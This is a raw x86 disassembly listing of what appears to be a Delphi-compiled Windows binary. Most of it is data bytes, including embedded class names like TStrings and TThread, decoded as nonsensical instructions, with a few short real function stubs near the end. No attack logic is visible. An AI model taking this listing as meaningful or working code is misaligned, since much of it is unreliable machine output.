inc edx
add [ edx + edx * 2 + 0x52840042 ] cl
inc edx
add ah dh
push eax
nop
dec esi
inc edx
add [ eax - 0x3fffbdb2 ] bl
imul esi [ ebx + 0x74 ] 0x24746e65
push ds
inc edx
add [ ebp + ebx + 0x42 ] dl
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
inc edx
add [ edx ] al
add bh bh
inc edx
add [ edx + edx * 2 + 0x50f40042 ] al
jae r-xdata
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ edi ] bl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebx ] al
inc edx
add [ edx ] dl
pop ds
inc edx
add [ eax ] dl
add [ eax ] al
add ah dl
sbb al 0x42
sub_422264
push cs
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
add [ fs : eax + eax - 0x1c ] 0x90004269
outsb
dec ecx
je r-xdata
bound eax [ edx ]
jl r-xdata
add [ eax + 0x6a ] ch
inc edx
add [ eax + 0x6a ] bh
inc edx
add [ ecx + ebx * 2 ] al
inc edx
add [ ebx + ebp * 2 ] dl
inc edx
add [ ebx + ebp * 2 + 0x42 ] bh
add ah bh
imul eax [ edx ] 0xffffff88
pop ebp
inc edx
add [ eax + 0x426d ] bl
pushad
inc edx
add ah dl
pushad
inc edx
add ah dl
insd
inc edx
add ah ah
insd
inc edx
add [ eax ] bh
popad
inc edx
add [ ecx + 0x61e80042 ] cl
inc edx
add ah dh
popad
inc edx
add al ch
dec esi
inc edx
add al ch
pop edx
inc edx
add [ ecx + ebx * 2 + 0x6d000042 ] bh
add [ eax + eax - 0x1c ] 0x90004269
inc edx
add [ ebp * 2 + 0x6d380042 ] dh
inc edx
add [ ebp * 2 + 0x5ddc0042 ] bh
inc edx
add [ esi + ebp * 2 + 0x6f100042 ] dh
inc edx
add al ch
outsd
inc edx
add [ esi ] bh
inc edx
add [ eax + 0x70 ] cl
inc edx
add al dl
jo r-xdata
insd
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
les edx [ esi + 0x44 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x22dc9090 ] dl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x42 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ ebx ] ah
inc edx
add [ eax + eax ] cl
add [ eax ] dh
and [ edx ] eax
insb
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add ah ah
imul eax [ edx ] sub_424e90
call 0xffffffffbc42653f
pop ecx
inc edx
add [ eax ] al
insd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x24
inc edx
add [ esp + 0x64ec0042 ] cl
inc edx
add ah bh
inc edx
add ah ch
inc edx
add ah bl
push 0x42
add al bh
push 0x42
add [ eax ] bh
outsb
inc edx
add [ esp + ebp * 2 + 0x42 ] bh
add [ eax - 0x67ffbd90 ] cl
jo r-xdata
and al 0x42
add [ eax + eax ] cl
add [ eax ] al
mov eax 0x6c004223
add ah dh
inc edx
add [ eax ] cl
add [ eax ] al
add al ah
push esi
inc esp
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp ] ch
add [ ebx ] cl
push esp
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x77 ] bh
inc edx
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax ] al
add [ eax + 0x6c004223 ] bh
add [ ebx + esi * 2 ] cl
inc edx
add [ eax - 0x6fffbb87 ] dl
jns r-xdata
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax - 0x57ffbb7f ] ah
jb r-xdata
imul ebp [ esi + 0x67 ] 0x7473694c
xchg esp eax
and eax [ edx ]
pop es
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 2 + 0x772c0042 ] cl
inc edx
add [ edi + esi * 2 ] bh
inc edx
add ah dl
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ ecx + edi * 2 + 0x42 ] ch
add [ eax + 0x78004272 ] ch
ja r-xdata
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ edi + esi * 2 + 0x42 ] cl
add [ 0x6e614854 ] cl
insb
push ebx
je r-xdata
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax - 0x57ffbb7f ] ah
jb r-xdata
add ah dl
jae r-xdata
jb r-xdata
dec eax
add [ eax + eax + 0x64 ] 0xa0004481
add [ eax + eax - 0x58 ] 0xf4004272
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
cmp al 0x22
inc edx
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add ah dh
jb r-xdata
add [ eax ] al
add al al
and eax 0x140042
add [ eax ] al
mov eax 0x6c004223
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax - 0x57ffbb7f ] ah
jb r-xdata
add [ edi + esi * 2 + 0x42 ] cl
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah al
push esi
inc esp
add [ eax ] cl
add [ eax ] al
add [ ebx ] cl
push esp
inc esi
imul ebp [ ebp + 0x53 ] 0x61657274
insd
nop
nop
movsb [ edi ] [ esi ]
and eax 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl [ 0x140042 ] 0x0
add [ eax + 0x6c004223 ] bh
jae r-xdata
popad
insd
nop
nop
adc [ 0x42 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x25
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ eax + eax + 0x44 ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xa0004481
add [ eax + eax - 0x58 ] 0x78004272
ja r-xdata
add [ eax + 0x74 ] bl
inc edx
add [ edi ] al
push esp
push ebx
je r-xdata
aam 0x73
inc edx
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
inc edx
add [ eax + eax ] bl
add [ eax ] al
dec esp
add [ ebx + esi * 2 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x42 ] cl
add [ eax ] bl
add [ eax ] al
add [ ebx + esi * 2 ] cl
inc edx
add [ eax - 0x6fffbd87 ] ch
jns r-xdata
add [ eax ] al
add [ esi ] bh
and eax 0x100042
add [ eax ] al
xor al 0x24
inc edx
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ edi + esi * 2 + 0x772c0042 ] cl
inc edx
add [ edi + esi * 2 ] bh
inc edx
add ah dl
jae r-xdata
popad
insd
mov [ edx + eax * 2 ] fs
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004224 ] ch
add [ eax + 0x24109090 ] dl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
and al 0x4
mov eax [ eax ]
jmp [ eax + 0xc ]
add [ eax - 0xbffbd8e ] ch
jb r-xdata
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ eax ] al
add [ ebp + 0x42 ] cl
add [ edx + eax * 4 + 0x44 ] ch
add al ah
jns r-xdata
add [ ebp + 0x42 ] cl
add [ edx + eax * 4 + 0x44 ] ch
add al ah
jns r-xdata
add [ esp + 0x4 ] 0xffffffec
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x10 ]
add [ ebx + esi * 2 ] cl
inc edx
add [ eax + 0x38004279 ] ch
jge r-xdata
and eax 0x826c0042
inc esp
add [ eax + 0x74 ] bl
inc edx
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ edx + edi * 2 ] al
inc edx
add [ eax - 0x57ffbd8e ] ch
jpe r-xdata
and eax 0x826c0042
inc esp
add [ eax + 0x74 ] bl
inc edx
add [ ebx ] dl
push esp
inc ebx
jne r-xdata
pushad
adc [ ebx - 0x13fbdbbc ] al
add al ah
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax ] cl
jge r-xdata
add [ eax + eax + 0x4c ] 0x84
inc esp
add [ 0x6d654d54 ] cl
outsd
jb r-xdata
test al 0x79
inc edx
add [ ebx + edi * 2 + 0x42 ] dl
je r-xdata
mov eax [ esp + 0x4 ]
and al 0x4
in al dx
add [ eax + 0x74 ] bl
inc edx
je r-xdata
push ebx
je r-xdata
inc edx
add [ eax + 0x54004279 ] ch
jpo r-xdata
insd
dec ebp
insd
outsd
jb r-xdata
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
mov eax [ eax ]
jmp [ eax + 0x14 ]
inc esp
and al 0x4
add [ edi ] cl
push esp
push edx
jae r-xdata
jns r-xdata
popad
insd
nop
nop
mov ah 0x26
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
jpe r-xdata
push ebx
je r-xdata
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
arpl [ ebp + 0x53 ] sp
je r-xdata
popad
insd
sub al 0x26
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
sub_4227f4
shl [ edi ] 0x1
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebp + 0x42 ] dh
add [ eax + eax ] bl
nop
inc esp
sub [ edx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insd
inc ecx
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ edx ] eax
xchg esp eax
add [ eax ] al
add ah ch
sub [ edx ] al
insb
inc esp
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax - 0x3fffbd83 ] bl
jge r-xdata
add [ eax ] al
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp + 0x42 ] dl
add [ eax + eax ] ch
jb r-xdata
add [ esp + eax * 4 + 0x44 ] cl
add [ edx + eax * 4 + 0x44 ] dh
nop
push esp
sub al [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
sub al [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jle r-xdata
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax - 0x6fffbb87 ] dl
jns r-xdata
add [ eax ] al
fcom [ edi + 0x44 ]
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ eax - 0x47 ] bl
inc esp
add [ ecx + edi * 4 + 0x44 ] ah
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ ecx + edi * 4 + 0x44 ] dh
add [ ecx + eax * 4 + 0x44 ] ah
add al ah
in eax dx
inc edx
add [ eax ] bl
out dx al
inc edx
add [ eax - 0x17ffbd12 ] al
out dx al
inc edx
add [ edi + ebp * 8 + 0x42 ] ch
add al dl
out dx eax
inc edx
add al bl
int1
inc edx
add ah ah
int1
inc edx
add al dh
int1
inc edx
add ah bh
int1
inc edx
add [ eax ] cl
inc edx
add [ edx + esi * 8 + 0x540e0042 ] al
push ebx
je r-xdata
sbb al 0x0
fsubr [ eax ]
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
sub [ edx ] al
or al 0x0
add [ eax ] al
loopne r-xdata
dec eax
add [ eax + eax + 0x64 ] 0x4481
mov cl 0x42
add [ eax ] ch
mov dl 0x42
add [ eax ] bh
mov cl 0x42
add [ eax - 0x4f ] ah
inc edx
add ah ah
mov cl 0x42
add [ esi + esi * 4 ] ah
inc edx
add [ ecx + esi * 4 + 0xe0042 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
les edx [ esi + 0x44 ]
add [ eax + eax ] ch
add [ eax ] al
pop es
push esp
push edi
jb r-xdata
inc edx
add [ eax + eax ] bl
add ah ch
sub [ edx ] al
insb
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax ] al
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add ah ah
test [ edx ] al
sar [ ebp + 0x42 ] 0x0
inc esp
test [ edx ] eax
add [ ebp - 0x76dfffbe ] 0x42
add [ esi + eax * 4 + 0x42 ] bh
add [ ebx + ebp * 4 + 0x42 ] ah
add [ eax + 0x10004286 ] ah
xchg [ edx ] eax
xor al 0xac
inc edx
add [ esp + ebp * 4 ] bl
inc edx
add ah dl
xchg edi eax
inc edx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah al
push esi
inc esp
add [ eax + 0x7000000 ] al
push esp
push edx
popad
jb r-xdata
add [ eax + 0x6004479 ] dl
push esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
sub [ edx ] eax
sub al 0x0
inc esp
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add ah dl
cmp al [ edx ]
or al 0x54
inc ebx
insb
popad
jae r-xdata
jb r-xdata
je r-xdata
inc esi
imul ebp [ ebp + 0x72 ] 0x4229b490
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
sub [ edx ] eax
inc esi
imul ebp [ esi + 0x64 ] 0x90907265
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x422b ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl al
sub eax [ edx ]
inc esp
add [ eax ] al
add al ah
push esi
inc esp
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add al ah
fld [ edx ]
push 0x6c004484
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0x60004481
fld [ edx ]
pushfd
fiadd [ edx ]
nop
jns r-xdata
popad
hlt
push esp
push 0x64616572
hlt
jb r-xdata
jns r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] ch
sub eax [ edx ]
and [ eax ] al
add [ eax ] al
pop es
push esp
push esp
push 0x64616572
nop
nop
shr [ ebx ] 0x1
inc edx
add [ edx ] dl
push cs
push esp
inc ebx
outsd
insd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ esi + 0x2a ] bh
nop
loopne r-xdata
jmp r-xdata
push edi
inc esp
add [ ecx ] al
pop es
call 0xffffffffe3e8e571
rcl [ ecx ] 0x1
stosb [ edi ]
mov cl 0x0
ror [ edi - 0x4f ] 0x6f
mov esp 0x616c4307
jae r-xdata
aam 0x8b
inc esp
and al 0x4
mov eax [ eax ]
jmp [ eax + 0x28 ]
outsb
outsb
je r-xdata
insb
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ edi ] al
inc ebp
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
sub al [ edx ]
sbb al 0x0
add [ eax ] al
mov esp 0x6c004337
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
add [ edx ] al
add [ eax ] al
add [ eax + 0x18 ] bl
mov esp edx
xchg ah ch
pop ecx
inc ebp
jae r-xdata
add bh bh
pushad
sub [ ebx - 0x27fbdbbc ] al
jmp r-xdata
popad
insd
in al 0x2b
inc edx
add [ edi ] cl
cmovns eax [ ebp + 0x73 ]
imul esp [ edi + 0x6e ] 0x6f4e7265
je r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
or eax 0xffffffff
jmp r-xdata
call [ eax - 0x3f7c3370 ]
fsubr st1
jpo r-xdata
add bh bh
inc esp
and al 0x4
aam 0xe9
pop ss
mov esi 0xcccc0000
int3
pop ebp
retn 0x4
add [ eax ] al
add [ esp + 0x4 ] 0xffffffd8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
sub_422b2c
push cs
adc dl [ ebx + edx * 2 + 0x79 ]
outsb
arpl [ eax + 0x72 ] bp
outsd
outsb
imul edi [ edx + 0x65 ] 0x6f636552
jb r-xdata
pushad
fld [ edx ]
pushfd
fiadd [ edx ]
nop
jns r-xdata
sbb [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
jns r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] ch
sub eax [ edx ]
and [ eax ] al
add [ eax ] al
pop es
push esp
push esp
push 0x64616572
nop
nop
shr [ ebx ] 0x1
inc edx
add [ edx ] dl
push cs
push esp
inc ebx
outsd
insd
jo r-xdata
jmp r-xdata
push edi
inc esp
add [ ecx ] al
pop es
call 0xffffffffe3e8e571
rcl [ ecx ] 0x1
stosb [ edi ]
mov cl 0x0
ror [ edi - 0x4f ] 0x6f
mov esp 0x616c4307
jae r-xdata
aam 0x8b
inc esp
and al 0x4
mov eax [ eax ]
jmp [ eax + 0x28 ]
outsb
outsb
je r-xdata
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
add [ edx ] al
add [ eax ] al
add [ eax + 0x18 ] bl
mov esp edx
xchg ah ch
pop ecx
inc ebp
jae r-xdata
add bh bh
pushad
sub [ ebx - 0x27fbdbbc ] al
jmp r-xdata
popad
insd
in al 0x2b
inc edx
add [ edi ] cl
cmovns eax [ ebp + 0x73 ]
imul esp [ edi + 0x6e ] 0x6f4e7265
je r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
or eax 0xffffffff
jmp r-xdata
call [ eax - 0x3f7c3370 ]
fsubr st1
jpo r-xdata
add bh bh
inc esp
and al 0x4
aam 0xe9
pop ss
mov esi 0xcccc0000
int3
pop ebp
retn 0x4
add [ eax ] al
add [ esp + 0x4 ] 0xffffffd8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
sub_422dbe
inc ebx
outsd
insd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
inc edx
add [ eax + eax ] bl
add [ eax ] al
loopne r-xdata
outsb
outsb
je r-xdata
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x10909090
das
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp + 0x42 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2f ] bl
inc edx
add [ eax + 0x2f ] ah
inc edx
add [ eax + eax ] bl
add al al
sub al 0x42
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add ah bh
jmp 0xffffffff84a62f38
inc esp
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add al ch
0xeae40042 0x42
add [ eax ] al
adc [ eax ] al
std
int3
sub_422ef6
inc esp
add [ eax - 0x1d ] cl
inc edx
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add al bl
jmp r-xdata
in al dx
inc edx
add [ eax + 0x10042ec ] dl
add bh ch
push [ esp + ebp * 8 + 0x42 ]
add [ esp + edx * 2 ] cl
inc edx
popad
jae r-xdata
add [ edi + 0x5e ] bl
pop ebx
retn
arpl [ ecx + 0x63 ] ax
je sub_422fd4
outsd
outsb
nop
nop
nop
je r-xdata
outsb
inc edx
add [ edi ] al
or al 0x54
inc edx
popad
jae sub_422fe4
or al 0x50
popad
jo r-xdata
arpl [ ecx + 0x63 ] ax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_432a2c
pop edi
pop esi
mov ebx eax
outsb
je r-xdata
mov eax [ ebp + 0xc ]
push eax
push edi
mov edi ecx
mov esi edx
mov ebx eax
outsd
outsb
adc [ edi ] ch
inc edx
add al cl
sub eax 0x20042
pop es
inc ebx
insb
popad
jae r-xdata
inc ebp
or [ eax - 0x75 ] dl
iretd
jns r-xdata
pop ebx
pop ebp
retn 0x8
jae r-xdata
push esi
inc esp
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah al
je r-xdata
add [ eax + 0x422f9c90 ] dl
add [ esi ] cl
push cs
push esp
dec ecx
outsb
sub_422fbc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_432a5c
pop edi
pop esi
pop ebx
retn
sub_422fe4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_432a2c
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_42300c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_432b40
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_423138
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_4246e8
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_448428
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_448428
test al al
je r-xdata
sub_423198
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
